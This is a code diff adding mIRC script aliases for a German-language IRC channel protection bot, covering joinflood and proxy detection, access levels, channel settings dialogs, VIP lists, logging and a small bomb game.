+        inc %y
+      }
+    }
+    inc %x 
+  }
+}
+alias joinflood {
+  if (i !isincs $chan($1).mode) {
+    var %nicks = $hget(Joinflooder,$1)
+    mode $1 +ir 
+    set -u91 %yes. [ $+ [ $1 ] ] 1 
+    msg $1 $styles(Detected a Joinflood; Channel is closed; Type $+($textprefix($1),open) to open the channel)
+    timerjoinflood. [ $+ [ $1 ] ] 1 90 mode $1 -ir
+    var %x = 1
+    while (%x <= $numtok(%nicks,32)) {
+      PPB_Kick $1 $gettok(%nicks,%x,32) Du bist gebannt vom Channel; Grund: Joinflood
+      inc %x
+    }
+  }
+}
+alias proxy {    
+  if ($regex($address($2,0),^.*!~[a-z]{1}[0-9]{3}\@.*$)) || ($regex($address($2,0),^.*!~[a-z]{1}[0-9]{4}\@.*$)) || ($nummertok($2) >= 4)  { return $true }
+  else { return $false }
+}
+alias nummertok { var %x = 1,%result | while %x <= $len($1) { if $mid($1,%x,1) isnum { inc %result } |  inc %x } | return $iif(%result,$ifmatch,0) }
+alias bhost {
+  var %scan.ial = $address($1,5)
+  if (.users.quakenet.org isin %scan.ial) { return $address($1,2) }
+  if (.dip.t-dialin.net isin %scan.ial) || (aol isin %scan.ial) || (.dip0.t-ipconnect.de isin %scan.ial) || (.arcor-ip.net isin %scan.ial) { return $address($1,3) }
+  else { return $address($1,1) }
+}
+alias generate { set -u5 %loginPW $rand(a,z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(A,Z) $+ $rand(a,z) }
+alias cmd {
+  tokenize 32 $replace($1,$chr(124),$chr(176)) $2 $3
+  if ($3 == !prefix) { return $true }
+  if ($right($2,$calc($len($2) - 1)) == $3) { if ($left($2,1) == $chr(33)) { return $true } }
+  if ($right($2,$calc($len($2) - $len($item($1,prefix)))) == $3) { 
+    if ($left($2,$len($item($1,prefix))) == $item($1,prefix)) { return $true }
+    else { return $false }
+  }
+}
+alias checkcmd {
+  if ($len($2) > 1) {
+    if ($1 isin $config(channels)) {
+      if ($left($2,1) == $item($1,prefix)) { return $true }
+      if ($left($2,$len($item($1,prefix))) == $item($1,prefix)) { return $true }
+      else { return $false }
+    }
+  }
+  else { return $false }
+}
+alias access {
+  if ($1 == all) { return $true | halt }
+  if ($hget(Login,$+($bhost($2),.Access)) == 150) { return 150 | halt }
+  if ($hget(Login,$+($bhost($2),.Access)) == 125) { return 125 | halt }
+  if ($1 isin $readini(bot_list.ini,$bhost($2),channel)) { return 100 | halt }
+  if ($1 isin $hget(Login,$+($bhost($2),.Channel))) {
+    var %x = 1
+    while (%x <= $numtok($hget(Login,$+($bhost($2),.Channel)),32)) {
+      if ($1 isin $gettok($hget(Login,$+($bhost($2),.Channel)),%x,32)) {
+        return $gettok($gettok($gettok($hget(Login,$+($bhost($2),.Channel)),%x,32),2,40),1,41) 
+      }
+      inc %x
+    }
+  }
+  else { return 0 }
+}
+alias scriptlines { 
+  var %x = 1 
+  while (%x <= $script(0)) {
+    set %script.lines $calc(%script.lines + $lines($script(%x))) 
+    inc %x 
+  } 
+  set %scriptlines %script.lines
+  unset %script.lines 
+}
+alias vip.load.channel {
+  tokenize 32 $+($replace($1,$chr(124),$chr(176)),.vip)
+  did -r main_manager 128 
+  var %x = 1
+  while (%x <= $ini($1,0)) {
+    if ($chr(35) isin $ini($1,%x)) {
+      did -a main_manager 128 $ini($1,%x)
+      did -z main_manager 128
+    }
+    inc %x
+  }
+}
+
+alias vip.load.hosts {
+  tokenize 32 $+($replace($1,$chr(124),$chr(176)),.vip)
+  did -r main_manager 128 
+  var %x = 1
+  while (%x <= $ini($1,0)) {
+    if ($chr(64) isin $ini($1 $+,%x)) {
+      did -a main_manager 128 $ini($1,%x)
+      did -z main_manager 128
+    }
+    inc %x
+  }
+}
+alias viphosts {
+  tokenize 32 $+($replace($1,$chr(124),$chr(176)),.vip)
+  var %x = 1
+  while (%x <= $ini($1,0)) {
+    if ($chr(64) isin $ini($1,%x)) { var %y = %y $+($ini($1,%x),$chr(40),Get: $readini($1,$ini($1,%x),get),$chr(41)) }
+    inc %x
+  }
+  return $iif(%y,%y,None)
+}
+alias vipchans {
+  tokenize 32 $+($replace($1,$chr(124),$chr(176)),.vip)
+  var %x = 1
+  while (%x <= $ini($1,0)) {
+    if ($chr(35) isin $ini($1,%x)) { var %y = %y $+($ini($1,%x),$chr(40),Reg: $readini($1,$ini($1,%x),reg) ; Get: $readini($1,$ini($1,%x),get),$chr(41)) }
+    inc %x
+  }
+  return $iif(%y,%y,None)
+}
+alias save.settings.default {
+  tokenize 32 $replace($1,$chr(124),$chr(176))
+  hadd -m $1 $+(Settings,.Prefix) ?
+  hadd -m $1 $+(Settings,.Autovoice) off
+  hadd -m $1 $+(Settings,.Autoop) off
+  hadd -m $1 $+(Settings,.homepage) none
+  hadd -m $1 $+(Settings,.news) none
+  hadd -m $1 $+(Settings,.sponsor) none
+  hadd -m $1 $+(Settings,.chanowner) Der +n Mann :D
+  hadd -m $1 $+(Settings,.botowner) ich gehör mir selber :D
+  hadd -m $1 $+(Settings,.welcome) on
+  hadd -m $1 $+(Settings,.welcome-msg) Type !help too see my bot Commands
+  hadd -m $1 $+(Settings,.repeat) off
+  hadd -m $1 $+(Settings,.repeat-time) 30
+  hadd -m $1 $+(Settings,.repeat-msg) Diese Nachricht wird alle 45 wiederholt.
+  hadd -m $1 $+(Settings,.tsave) off
+  hadd -m $1 $+(Settings,.Topic) NO TOPIC
+  hadd -m $1 $+(Settings,.protection) on
+  hadd -m $1 $+(Settings,.bitchmode) on
+  hadd -m $1 $+(Settings,.massmode) off
+  hadd -m $1 $+(Settings,.massmode-times) 3 
+  hadd -m $1 $+(Settings,.massmode-sec) 5
+  hadd -m $1 $+(Settings,.Proxy) on
+  hadd -m $1 $+(Settings,.joinflood) off
+  hadd -m $1 $+(Settings,.antimode) on
+  hadd -m $1 $+(Settings,.autolimit) off
+  hadd -m $1 $+(Settings,.limit) 5
+  hadd -m $1 $+(Settings,.advertise) on
+  hadd -m $1 $+(Settings,.advertise-ban) 3
+  hadd -m $1 $+(Settings,.spam) on
+  hadd -m $1 $+(Settings,.spam-msgs) 5
+  hadd -m $1 $+(Settings,.spam-secs) 3
+  hadd -m $1 $+(Settings,.spam-ban) 5
+  hadd -m $1 $+(Settings,.wiederholung) on
+  hadd -m $1 $+(Settings,.wiederholung-msgs) 3
+  hadd -m $1 $+(Settings,.wiederholung-ban) 5
+  hadd -m $1 $+(Settings,.Badword) on
+  hadd -m $1 $+(Settings,.Badword-ban) 5
+  hadd -m $1 $+(Settings,.Wetter) off
+  hadd -m $1 $+(Settings,.wetter-chan) off
+  hadd -m $1 $+(Settings,.wetter-nick) on
+  hadd -m $1 $+(Settings,.tv) off
+  hadd -m $1 $+(Settings,.tv-chan) off
+  hadd -m $1 $+(Settings,.tv-nick) on
+  hadd -m $1 $+(Settings,.google) off
+  hadd -m $1 $+(Settings,.google-chan) on
+  hadd -m $1 $+(Settings,.google-nick) off
+  hadd -m $1 $+(Settings,.vip) off
+  hadd -m $1 $+(Settings,.newsticker) off
+  hadd -m $1 $+(Settings,.lamerdetect) on
+  hadd -m $1 $+(Settings,.peak) on
+  hadd -m $1 $+(Settings,.flagsremove) on
+  hadd -m $1 $+(Settings,.trojan) on
+  hadd -m $1 $+(Settings,.protect-stat) low
+  hadd -m $1 $+(Settings,.bombgame) off
+  hadd -m $1 $+(Settings,.badnick) on
+  hadd -m $1 $+(Settings,.Kickmsgs) default
+  save.hashtables
+}
+alias save.settings {
+  tokenize 32 main_manager $replace($1,$chr(124),$chr(176)) $1
+  if ($did($1,201).state) { hadd -m Config Misc.req-status on | hadd -m Config Misc.req-idler $iif($did($1,203).text,$ifmatch,30) }
+  else { hadd -m Config Misc.req-status off }
+  if ($did($1,25).text) {
+    if $did($1,34).text { hadd -m $2 Settings.Prefix $did($1,34).text } | else { hadd -m $2 Settings.prefix ? }
+    if $did($1,38).state { hadd -m $2 Settings.chanbot L } 
+    if $did($1,37).state { hadd -m $2 Settings.chanbot Q } 
+    if $did($1,41).state { hadd -m $2 Settings.autovoice on } | else { hadd -m $2 Settings.autovoice off }
+    if $did($1,42).state { hadd -m $2 Settings.autoop on } | else { hadd -m $2 Settings.autoop off }
+    if $did($1,49).text { hadd -m $2 Settings.homepage $did($1,49).text } | else { hadd -m $2 Settings.homepage www.mypTx.de }
+    if $did($1,50).text { hadd -m $2 Settings.news $did($1,50).text } | else { hadd -m $2 Settings.news Dieser Channel wird von MIR protected }
+    if $did($1,51).text { hadd -m $2 Settings.sponsor $did($1,51).text } | else { hadd -m $2 Settings.sponsor mypTx(Channelbot) }
+    if $did($1,52).text { hadd -m $2 Settings.chanowner $did($1,52).text } | else { hadd -m $2 Settings.chanowner me :) }
+    if $did($1,53).text { hadd -m $2 Settings.botowner $did($1,53).text } | else { hadd -m $2 Settings.botowner L/Q }
+    if $did($1,61).state { hadd -m $2 Settings.welcome on } | else { hadd -m $2 Settings.welcome off }
+    if $did($1,62).text { hadd -m $2 Settings.welcome-msg $did($1,62).text } | else { hadd -m $2 Settings.welcome-msg Type !help to see my Commands }
+    if $did($1,74).state { hadd -m $2 Settings.protection on } | else { hadd -m $2 Settings.protection off }
+    if $did($1,75).state { hadd -m $2 Settings.bitchmode on } | else { hadd -m $2 Settings.bitchmode off }
+    if $did($1,76).state { hadd -m $2 Settings.massmode on } | else { hadd -m $2 Settings.massmode off }
+    if $did($1,77).text { hadd -m $2 Settings.massmode-times $did($1,77).text } | else { hadd -m $2 Settings.massmode-times 3 }
+    if $did($1,79).text { hadd -m $2 Settings.massmode-sec $did($1,79).text } | else { hadd -m $2 Settings.massmode-sec 5 }
+    if $did($1,81).state { hadd -m $2 Settings.Proxy on } | else { hadd -m $2 Settings.proxy off }
+    if $did($1,82).state { hadd -m $2 Settings.joinflood on } | else { hadd -m $2 Settings.joinflood off }
+    if $did($1,83).state { hadd -m $2 Settings.antimode on } | else { hadd -m $2 Settings.antimode off }
+    if $did($1,110).state { hadd -m $2 Settings.autolimit on } | else { hadd -m $2 Settings.autolimit off }
+    if $did($1,111).text { hadd -m $2 Settings.limit $did($1,111).text } | else { hadd -m $2 Settings.limit 10 }
+    if $did($1,85).state { hadd -m $2 Settings.advertise on } | else { hadd -m $2 Settings.advertise off }
+    if $did($1,100).text { hadd -m $2 Settings.advertise-ban $did($1,100).text } | else { hadd -m $2 Settings.advertise-ban 5 }
+    if $did($1,87).state { hadd -m $2 Settings.spam on } | else { hadd -m $2 Settings.spam off }
+    if $did($1,88).text { hadd -m $2 Settings.spam-msgs $did($1,88).text } | else { hadd -m $2 Settings.spam-msgs 5 }
+    if $did($1,90).text { hadd -m $2 Settings.spam-secs $did($1,90).text } | else { hadd -m $2 Settings.spam-secs 3 }
+    if $did($1,101).text { hadd -m $2 Settings.spam-ban $did($1,101).text } | else { hadd -m $2 Settings.spam-ban 3 }
+    if $did($1,92).state { hadd -m $2 Settings.wiederholung on } | else { hadd -m $2 Settings.wiederholung off }
+    if $did($1,94).text { hadd -m $2 Settings.wiederholung-msgs $did($1,93).text } | else { hadd -m $2 Settings.wiederholung-msgs 3 }
+    if $did($1,102).text { hadd -m $2 Settings.wiederholung-ban $did($1,102).text } | else { hadd -m $2 Settings.wiederholung-ban 3 }
+    if $did($1,95).state { hadd -m $2 Settings.Badword on } | else { hadd -m $2 Settings.badword off }
+    if $did($1,103).text { hadd -m $2 Settings.Badword-ban $did($1,103).text } | else { hadd -m $2 Settings.badword-ban 5 }
+    if $did($1,113).state { hadd -m $2 Settings.Wetter on } | else { hadd -m $2 Settings.Wetter off }
+    if $did($1,115).state { hadd -m $2 Settings.wetter-chan on } | else { hadd -m $2 Settings.Wetter-chan off } 
+    if $did($1,114).state { hadd -m $2 Settings.wetter-nick on } | else { hadd -m $2 Settings.Wetter-nick off }
+    if $did($1,117).state { hadd -m $2 Settings.Tv on } | else { hadd -m $2 Settings.tv off }
+    if $did($1,123).state { hadd -m $2 Settings.Tv-chan on } | else { hadd -m $2 Settings.tv-chan off }
+    if $did($1,121).state { hadd -m $2 Settings.Tv-nick on } | else { whadd -m $2 Settings.tv-nick off }
+    if $did($1,118).state { hadd -m $2 Settings.Google on } | else { hadd -m $2 Settings.Google off }
+    if $did($1,124).state { hadd -m $2 Settings.Google-chan on } | else { hadd -m $2 Settings.google-chan off }
+    if $did($1,122).state { hadd -m $2 Settings.Google-nick on } | else { hadd -m $2 Settings.google-nick off }
+    if $did($1,144).state { hadd -m $2 Settings.VIP on } | else { hadd -m $2 Settings.VIP off }
+    if $did($1,146).state { hadd -m $2 Settings.Newsticker on } | else { hadd -m $2 Settings.Newsticker off }   
+    if $did($1,147).state { hadd -m $2 Settings.lamerdetect on } | else { hadd -m $2 Settings.lamerdetect off }  
+    if $did($1,149).state { hadd -m $2 Settings.peak on } | else { hadd -m $2 Settings.peak off }  
+    if $did($1,150).state { hadd -m $2 Settings.flagsremove on } | else { hadd -m $2 Settings.flagsremove off }
+    if $did($1,151).state { hadd -m $2 Settings.trojan on } | else { hadd -m $2 Settings.trojan off }
+    if $did($1,152).state { hadd -m $2 Settings.protect-stat high } | else { hadd -m $2 Settings.protect-stat low }    
+    if $did($1,153).state { hadd -m $2 Settings.protect-stat low } | else { hadd -m $2 Settings.protect-stat high }
+    if $did($1,154).state { hadd -m $2 Settings.bombgame on } | else { hadd -m $2 Settings.bombgame off }
+    if $did($1,156).state { hadd -m $2 Settings.badnick on } | else { hadd -m $2 Settings.badnick off } 
+    if $did($1,158).state { hadd -m $2 Settings.welcome-paste notice }  
+    if $did($1,159).state { hadd -m $2 Settings.welcome-paste query }
+    if $did($1,160).state { hadd -m $2 Settings.welcome-paste channel }
+    if $did($1,63).state { hadd -m $2 Settings.repeat on | if ($server) { $+(timer,$3,repeat) 0 $calc($item($3,repeat-time) * 60) .msg $3 $item($3,repeat-msg) } } | else { hadd -m $2 Settings.repeat off | if ($server) { $+(timer,$3,repeat) off } }
+    if $did($1,65).text { hadd -m $2 Settings.repeat-time $did($1,65).text } | else { hadd -m $2 Settings.repeat-time 30 }
+    if $did($1,67).text { hadd -m $2 Settings.repeat-msg $did($1,67).text } | else { hadd -m $2 Settings.repeat-msg -none- }
+    if $did($1,69).state { hadd -m $2 Settings.Tsave on } | else { hadd -m $2 Settings.tsave off }
+    if $did($1,70).text { 
+      hadd -m $2 Settings.topic $did($1,70)
+      if ($did($1,69).state) {
+        if ($server) {
+          if ($item($2,chanbot) == Q) { msg Q settopic $3 $hget($2,Settings.Topic) }
+          else { topic $3 $hget($2,Settings.Topic) }
+        }
+      }
+    }
+    save.hashtables  
+  } 
+}
+
+alias load.settings {
+  tokenize 32 main_manager $replace($1,$chr(176),$chr(124))
+  dialog -t main_manager myPPB $botversion - Channel: $2
+  did -ra $1 127 Channels | did -a $1 127 Hosts | did -r $1 128,139 | did -e $1 41,42 
+  did -ra $1 138 Blacklist | did -a $1 138 Authbanlist | did -a $1 138 Chanbanlist | did -u $1 141
+  if ($item($2,prefix)) { did -rae $1 34 $item($2,prefix) } | else { did -rae $1 34 ? }
+  if ($item($2,chanbot)) { did -e $1 38,37 | did -u $1 37,38 | if ($item($2,chanbot) == L) { did -ce $1 38 } | elseif ($item($2,chanbot) == Q) { did -ce $1 37 } } | else { did -u $1 37,38 }
+  if ($control($2,autovoice)) { did -c $1 41 } | else { did -u $1 41 }
+  if ($control($2,autoop)) { did -c $1 42 } | else { did -u $1 42 }
+  if ($item($2,homepage)) { did -r $1 49 | did -ae $1 49 $item($2,homepage) } | else { did -r $1 49 }
+  if ($item($2,news)) { did -r $1 50 | did -ae $1 50 $item($2,news) } | else { did -r $1 50 }
+  if ($item($2,sponsor)) { did -r $1 51 | did -ae $1 51 $item($2,sponsor) } | else { did -r $1 51 }
+  if ($item($2,chanowner)) { did -r $1 52 | did -ae $1 52 $item($2,chanowner) } | else { did -r $1 52 }
+  if ($item($2,botowner)) { did -r $1 53 | did -ae $1 53 $item($2,botowner) } | else { did -r $1 53 }
+  if ($control($2,welcome)) { did -c $1 61 | did -e $1 62 } | else { did -u $1 61 | did -b $1 62 }
+  if ($item($2,welcome-msg)) { did -ra $1 62 $item($2,welcome-msg) } | else { did -ra $1 62 -none- }
+  if ($control($2,repeat)) { did -c $1 63 | did -e $1 64,65,66,67 } | else { did -u $1 63 | did -b $1 64,65,66,67 }
+  if ($item($2,repeat-time)) { did -ra $1 65 $item($2,repeat-time) } | else { did -ra $1 65 30 }
+  if ($item($2,repeat-msg)) { did -ra $1 67 $item($2,repeat-msg) } | else { did -ra $1 67 -none- }
+  if ($control($2,tsave)) { did -c $1 69 | did -e $dname 70 } | else { did -u $1 69 | did -b $dname 70 }
+  if ($item($2,Topic)) { did -ra $1 70 $item($2,Topic) }
+  if ($control($2,protection)) { did -c $1 74 | did -e $1 75,76,81,82,83,147,150,151,152,153 } | else { did -u $1 74 | did -b $1 75,76,81,82,83,77,78,79,80,147,150,151,152,153 }
+  if ($control($2,bitchmode)) { did -c $1 75 } | else { did -u $1 75 }
+  if ($control($2,massmode)) { did -c $1 76 | did -e $1 77,78,79,80 } | else { did -u $1 76 | did -b $1 77,78,79,80 } 
+  if ($item($2,massmode-times)) { did -ra $1 77 $item($2,massmode-times) } 
+  if ($item($2,massmode-sec)) { did -ra $1 79 $item($2,massmode-sec) }
+  if ($control($2,proxy)) { did -c $1 81 } | else { did -u $1 81 }
+  if ($control($2,joinflood)) { did -c $1 82 } | else { did -u $1 82 }
+  if ($control($2,antimode)) { did -c $1 83 } | else { did -u $1 83 }
+  if ($control($2,autolimit)) { did -c $1 110 | did -e $1 111 } | else { did -u $1 110 | did -b $1 111 }
+  if ($item($2,limit)) { did -ra $1 111 $item($2,limit) } | else { did -ra $1 111 10 }
+  if ($control($2,advertise)) { did -c $1 85 | did -e $1 97,100,105 } | else { did -u $1 85 | did -b $1 97,100,105 }
+  if ($item($2,advertise-ban)) { did -ra $1 100 $item($2,advertise-ban) } | else { did -ra $1 100 2 }
+  if ($control($2,spam)) { did -c $1 87 | did -e $1 88,89,90,91,98,101,106 } | else { did -u $1 87 | did -b $1 88,89,90,91,98,101,106 }
+  if ($item($2,spam-msgs)) { did -ra $1 88 $item($2,spam-msgs) } | else { did -ra $1 88 4 }
+  if ($item($2,spam-secs)) { did -ra $1 90 $item($2,spam-secs) } | else { did -ra $1 90 5 }
+  if ($item($2,spam-ban)) { did -ra $1 101 $item($2,spam-ban) } | else { did -ra $1 101 3 }
+  if ($control($2,wiederholung)) { did -c $1 92 | did -e $1 93,94,99,102,107 } | else { did -u $1 92 | did -b $1 93,94,99,102,107 }
+  if ($item($2,wiederholung-msgs)) { did -ra $1 93 $item($2,wiederholung-msgs) } | else { did -ra $1 93 3 }
+  if ($item($2,wiederholung-ban)) { did -ra $1 102 $item($2,wiederholung-ban) } | else { did -ra $1 102 3 }
+  if ($control($2,badword)) { did -c $1 95 | did -e $1 104,103,108 } | else { did -u $1 95 | did -b $1 104,103,108 } 
+  if ($item($2,badword-ban)) { did -ra $1 103 $item($2,badword-ban) } | else { did -ra $1 103 5 }
+  if ($control($2,Wetter)) { did -c $1 113 | did -e $1 114,115,116 } | else { did -u $1 113 | did -b $1 114,115,116 }
+  if ($control($2,wetter-chan)) { did -c $1 115 } | else { did -u $1 115 }
+  if ($control($2,wetter-nick)) { did -c $1 114 } | else { did -u $1 114 }
+  if ($control($2,Tv)) { did -c $1 117 | did -e $1 119,123,121 } | else { did -u $1 117 | did -b $1 119,123,121 }
+  if ($control($2,Tv-nick)) { did -c $1 121 } | else { did -u $1 121 }
+  if ($control($2,Tv-chan)) { did -c $1 123 } | else { did -u $1 123 }
+  if ($control($2,Google)) { did -c $1 118 | did -e $1 120,124,122 } | else { did -u $1 118 | did -b $1 120,124,122 }
+  if ($control($2,Google-nick)) { did -c $1 122 } | else { did -u $1 122 }
+  if ($control($2,Google-chan)) { did -c $1 124 } | else { did -u $1 124 }
+  if ($control($2,Newsticker)) { did -c $1 146 | did -e $1 125 } | else { did -u $1 146 | did -b $1 125 }
+  if ($control($2,vip)) { did -c $1 144  | did -e $1 129,130 } | else { did -u $1 144 | did -b $1 129,130,131,132,133,135,136,137 }
+  if ($control($2,lamerdetect)) { did -c $1 147 } | else { did -u $1 147 }
+  if ($control($2,peak)) { did -c $1 149 } | else { did -u $1 149 }
+  if ($control($2,flagsremove)) { did -c $1 150 } | else { did -u $1 150 }
+  if ($control($2,trojan)) { did -c $1 151 } | else { did -u $1 151 }
+  if ($item($2,protect-stat) == high) { did -c $1 152 } | else { did -u $1 152 }
+  if ($item($2,protect-stat) == low) { did -c $1 153 } | else { did -u $1 153 }
+  if ($control($2,bombgame)) { did -c $1 154 } | else { did -u $1 154 }
+  if ($control($2,badnick)) { did -c $1 156 } | else { did -u $1 156 }
+  if ($item($2,welcome-paste) == notice) { did -c $1 158 } | else { did -u $1 158 }
+  if ($item($2,welcome-paste) == query) { did -c $1 159 } | else { did -u $1 159 }
+  if ($item($2,welcome-paste) == channel) { did -c $1 160 } | else { did -u $1 160 }
+
+}
+alias triggerlist {
+  var %x = 1
+  while (%x <= $hget($+($replace($1,$chr(124),$chr(176)),.Trigger),0).item) {
+    var %y = %y $hget($+($replace($1,$chr(124),$chr(176)),.Trigger),%x).item 
+    inc %x
+  }
+  return $iif(%y,$replace(%y,$chr(32),$chr(44)),-)
+}
+alias reset_chans {
+  did -r main_manager 25
+  var %x = 1
+  while (%x <= $channels(0)) {
+    did -a main_manager 25 $channels(%x)  
+    if ($me ison $channels(%x)) { join $channels(%x) }
+    inc %x
+  }
+}
+alias load.repeat { 
+  var %x = 1
+  while (%x <= $channels(0)) {
+    if ($control($channels(%x),repeat)) {
+      .timer 1 %x .msg $channels(%x) $item($channels(%x),repeat-msg) 
+      $+(timer,$channels(%x),repeat) 0 $calc($item($channels(%x),repeat-time) * 60) msg $channels(%x) $item($channels(%x),repeat-msg) 
+    }
+    inc %
+  }
+}
+alias load.autojoin {
+  did -r auto_join_list 4
+  did -b $dname 5 
+  if ($config(autojoin)) {
+    var %x = 1
+    while (%x <= $numtok($config(autojoin),32)) {
+      did -a auto_join_list 4 $gettok($config(autojoin),%x,32)
+      inc %x
+    }
+  }
+}
+alias load.blacklist { did -r main_manager 139 | var %x = 1 | while (%x <= $hget($+($1,.Blacklist),0).item) { did -a main_manager 139 $hget($+($1,.Blacklist),%x).item | did -z main_manager 139 | inc %x } }
+alias load.authbanlist { did -r main_manager 139 | var %x = 1 | while (%x <= $hget($+($1,.Authbanlist),0).item) { did -a main_manager 139 $hget($+($1,.Authbanlist),%x).item | did -z main_manager 139 | inc %x } }
+alias load.chanbanlist { did -r main_manager 139 | var %x = 1 | while (%x <= $hget($+($1,.Chanbanlist),0).item) { did -a main_manager 139 $hget($+($1,.Chanbanlist),%x).item | did -z main_manager 139 | inc %x } }
+alias vip.search {
+  tokenize 32 $+($replace($1,$chr(124),$chr(176)),vip)
+  did -u main_manager 131,132,133,135,136,137 
+  var %x = 1
+  while (%x <= $ini($1,0)) {
+    if ($2 == $ini($1,%x)) {
+      if ($readini($1,$ini($1,%x),get) == op) { did -c main_manager 133 } 
+      if ($readini($1,$ini($1,%x),get) == voice) { did -c main_manager 132 } 
+      if ($readini($1,$ini($1,%x),get) == none) { did -c main_manager 131 } 
+      if ($readini($1,$ini($1,%x),reg) == all) { did -c main_manager 137 }
+      if ($readini($1,$ini($1,%x),reg) == voice) { did -c main_manager 136 }
+      if ($readini($1,$ini($1,%x),reg) == op) { did -c main_manager 135 }
+    }
+    inc %x
+  }
+}
+alias chanidler {
+  set %idler1. [ $+ [ $1 ] ] $nick($1,0)
+  set %idler2. [ $+ [ $1 ] ] $calc(%idler1. [ $+ [ $1 ] ] - 1)
+}
+
+alias checkidler {
+  if ($2 isop $1) {
+    if (%idler2. [ $+ [ $1 ] ] > $config(req-idler)) {
+      .timer 1 5 .msg $botadmin $styles(Request: Eine anfrage: $2 für den Channel: $1 mit ( %idler2. [ $+ [ $1 ] ] Idler ))
+      .timer 1 5 .notice $2 $styles(Anfrage erfolgreich Der Botadmin $+($chr(40),$botadmin,$chr(41)) nimmt bald kontakt mit dir auf!) 
+      .timer 1 6 .part $1 
+    }
+    else {
+      .timer 1 5 .part $1
+      .timer 1 6 .notice $2 $styles(Anfrage fehler. Min.-Idler: $config(req-idler))
+      .timer 1 7 .msg $botadmin $styles(Amfrage Fehler $1 von $2 Grund: Nicht genug Idler. (Min.-Idler: $config(req-idler)))
+    }
+  }
+  else { 
+    .timer 1 5 .part $1
+    .timer 1 6 .notice $2 $styles(Request: Fehler kein @)
+    .timer 1 7 .msg $botadmin $styles(Request: Fehler $+(",$1,"))
+    unset %idler1. [ $+ [ $1 ] ]
+    unset %idler2. [ $+ [ $1 ] ]
+    unset %m.chans
+  }
+}
+
+alias query-log { 
+  if (!$window(@Queries)) { window -kb0zn @Queries }
+  if ($2 != hello) && ($2 != registry) && ($2 != login) && ($2 != auth) && ($2 != register) && ($2 != changePW) && ($2 != newpw) && ($2 != newpass) && ($2 != changemail) && ($2 != newmail) && ($2 != requestpassword) && ($2 != reguestPW) && ($2 != info) && ($2 != data) && ($2 != logout) && ($2 != unauth) { 
+    aline 1 @Queries $+([,$fulldate,]) :: $+($1,$chr(58)) $2-
+    write $+(Queries\,$replace($date,$chr(47),.),.txt) $+([,$fulldate,]) :: $+($1,$chr(58)) $2- 
+  }
+}
+
+alias log {
+  if (!$window(@LogSystem)) { window -kb0zn @LogSystem }
+  aline 1 @LogSystem $+([,$fulldate,]) :: $+([,$upper($1),]) $2- 
+  write $+(LogSystem\,$replace($date,$chr(47),.),.txt) $+([,$fulldate,]) :: $+([,$upper($1),]) $2- 
+}
+alias mass {
+  var %x = 1
+  while (%x <= $nick($1,0)) {
+    if ($3 iswm $nick($1,%x)) && ($nick($1,%x) != $me) { set %mass %mass $nick($1,%x) }
+    if ($numtok(%mass,32) == $modespl) { mode $1 $left($2,1) $+ $str($right($2,1),$modespl) $gettok(%mass,1-6,32) | unset %mass }
+    inc %x
+  }
+  if ($numtok(%mass,32) < $modespl) { mode $1 $left($2,1) $+ $str($right($2,1),$numtok(%mass,32)) %mass | unset %mass }
+}
+alias mdeop {
+  var %x = 1
+  while (%x <= $nick($1,0)) {
+    if ($3 iswm $nick($1,%x)) && ($nick($1,%x) != $me) && ($nick($1,%x) != $item($1,chanbot)) {
+      if ($access($1,$nick($1,%x)) < 25) { set %mass %mass $nick($1,%x) }
+    }
+    if ($numtok(%mass,32) == $modespl) { mode $1 $left($2,1) $+ $str($right($2,1),$modespl) $gettok(%mass,1-6,32) | unset %mass }
+    inc %x
+  }
+  if ($numtok(%mass,32) < $modespl) { mode $1 $left($2,1) $+ $str($right($2,1),$numtok(%mass,32)) %mass | unset %mass }
+}
+alias whoisall {
+  if  (!%whoising) {
+    set %whoising 1
+    var %x = $nick($1,0)
+    while (%x) {
+      whois $nick($1,%x) 
+      dec %x 
+    }
+    unset %whoising 
+    msg $1 $styles(Scanning) finished.
+  }
+}
+alias vip.check.all {
+  if  (!%whoising) {
+    set %whoising 1
+    var %x = $nick($1,0)
+    while (%x) {
+      set %vip. [ $+ [ $nick($1,%x) ] ] $1 
+      whois $nick($1,%x) 
+      dec %x 
+    }
+    unset %whoising 
+    msg $1 $styles(Scanning) finished.
+  }
+}
+alias authlist {
+  var %x = 1
+  while (%x <= $hget(Authen,0).item) {
+    var %y = %y $+($chr(40),%x,$chr(41),$hget(Authen,%x).item) 
+    inc %x
+  }
+  return %y
+}
+alias botadmin {
+  var %x = 1
+  while (%x <= $hget(Login,0).item) {
+    if ($right($hget(Login,%x).item,6) == Access) {
+      if ($hget(Login,$hget(Login,%x).item) >= 125) { var %admins = %admins $hget(Login,$replace($hget(Login,%x).item,Access,Nick)) }
+    }
+    inc %x
+  }
+  return $replace(%admins,$chr(32),$chr(44))
+}
+alias accchans {
+  if ($hget(login,$+($1.Channel))) {
+    var %chans = $hget(Login,$+($1,.Channel))
+    var %x = 1
+    while (%x <= $numtok(%chans,32)) {
+      if ($2 !isin $gettok(%chans,%x,32)) {
+        var %chans_end = %chans_end $gettok(%chans,%x,32)
+      }
+      inc %x
+    }
+    return %chans_end
+  }
+  else { return $false }
+}
+alias stop.bomb {
+  hfree $+(bombe,$1) bomb 
+  timerbombe. $+ $1 off
+}
+
+alias explosion {
+  if ($control($1,bombgame)) {
+    if ($hget($+(bombe,$1),nick) == $2) {
+      if ($access($1,$2) >= 25) { msg $1 $styles(Time) ist ende, nur 30sec zum knacken der Bombe ( no kick 4 ops ) }
+      else { PPB_kick $1 $2 Kicked; Game Over; }
+      stop.bomb $1
+    }
+  }
+}
+alias delbot {
+  var %channels = $numtok($readini(bot_list.ini,$4,channel),32)
+  if (%channels <= 1) { remini bot_list.ini $4 | notice $2 $styles(Bot: $3 $+ . Erfolgreich von der Botlist gelöscht.) }
+  elseif (%channels > 1) {
+    var %chans = $readini(bot_list.ini,$4,channel)
+    var %x = 1
+    while (%x <= %channels) {
+      if ($gettok(%chans,%x,32) == $1) {
+        var %del = %x
+      }
+      inc %x
+    }
+    writeini bot_list.ini $4 channel $deltok(%chans,%del,32)
+    notice $2 $styles(Bot: $3 $+ . Gelöscht.)
+  }
+}
+alias botlist {
+  var %x = 1
+  while (%x <= $ini(bot_list.ini,0)) {
+    if ($1 isin $readini(bot_list.ini,$ini(bot_list.ini,%x),channel)) {
+      var %bots = %bots $readini(bot_list.ini,$ini(bot_list.ini,%x),nick)
+    }
+    inc %x
+  }
+  return $iif(%bots,%bots,-none-)
+}
+alias botversion { return v3.01 }
+alias cmdurl { return Commands: http://www.mypTx.de/?section=commands_v3 }
